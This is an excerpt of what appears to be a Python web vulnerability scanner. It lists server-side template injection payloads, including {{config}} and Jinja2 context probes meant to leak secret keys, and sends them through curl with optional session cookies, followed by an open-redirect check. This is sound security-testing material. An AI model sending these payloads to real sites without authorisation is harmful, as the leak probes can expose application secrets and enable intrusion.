...
# ── SSTI payloads ─────────────────────────────────────────────────────────────
# Each entry: (payload, expected_response_pattern, template_engine_hint)
SSTI_PAYLOADS = [
    ("{{7*7}}",                  r"49",         "Jinja2/Twig"),
    ("${7*7}",                   r"49",         "FreeMarker/Groovy"),
    ("#{7*7}",                   r"49",         "Thymeleaf/MVEL"),
    ("<%= 7*7 %>",               r"49",         "ERB/EJS"),
    ("{{7*'7'}}",                r"7777777",    "Jinja2"),
    ("${{7*7}}",                 r"49",         "Spring/SPEL"),
    ("{7*7}",                    r"49",         "Smarty"),
    ("{% 7*7 %}",               r"49",         "Twig"),
    ("{{config}}",               r"SECRET_KEY|DATABASE", "Jinja2 config leak"),
    ("{{self._TemplateReference__context}}", r"SECRET", "Jinja2 context leak"),
]
...
def test_ssti_url(url: str, cookie_header: str, timeout: int) -> list[dict]:
    ...
    for param_key in params:
        for payload, expected_re, engine in SSTI_PAYLOADS:
            ...
            curl_cmd = ["curl", "-sk", "--max-time", str(timeout), "-L",
                        "--max-redirs", "3", "-A", "Mozilla/5.0"]
            if cookie_header:
                curl_cmd += ["-H", f"Cookie: {cookie_header}"]
            curl_cmd.append(test_url)

            try:
                r = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=timeout+2)
                body = r.stdout
                if re.search(expected_re, body):
                    finding = {
                        "type": "ssti",
                        "severity": "critical",
                        "url": url,
    ...
    for key in params:
        ...
        for payload in REDIRECT_PAYLOADS:
            ...
            try:
                ...
                # check if Location header points to our payload
                loc_match = re.search(r"location:\s*(\S+)", headers)
                if loc_match:
